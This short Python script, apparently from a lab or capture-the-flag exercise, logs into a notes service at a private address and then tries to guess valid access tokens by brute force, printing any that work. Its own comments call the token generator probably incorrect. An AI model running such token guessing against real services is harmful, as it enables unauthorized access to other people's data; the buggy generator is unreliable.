import requests
host = '10.67.0.41'
r = requests.get("http://"+host+":5000/token", params= {'username':'sam', 'password':'1234'})
notes = requests.get("http://"+host+":5000/notes", params={'token':r.text})

print(r.headers['content-type'])
print(r.text)

print(notes.headers['content-type'])
print(notes.text)

def try_token(token):
    req = requests.get("http://"+host+":5000/notes", params={'token':token})
    return req.status_code == 200

#pretty sure it doesnt even generate all possible tokens
#don't use it anyway it takes so long when you make a network request with each one wow
def gen_tokens(n, r): # takes a long time, also probably incorrect (maybe set t = [+1]*n after pos + 1 = len(l) and l[pos] == r)
    l = [0] * n
    t = [0] * n
    c = [r] * n
    pos = 0
    while not l == c:
        if l[pos] == r:
            t[pos] = t[pos] + 1
            l[pos] = t[pos]
            pos += 1
        if pos >= len(l):
            pos = 0
        l[pos] = l[pos] + 1
        yield "-".join([str(o) for o in l])


def dump_tokens(length, r): # dump all tokens of length 'length' with max value 'r'
    for token in gen_tokens(length, r):
        print(token)
        if (try_token(token)): print("#####################\n","Found: " + token + "\n","##################")

dump_tokens(1, 255) # test it (don't it takes actually forever) this is a stupid way of doing it
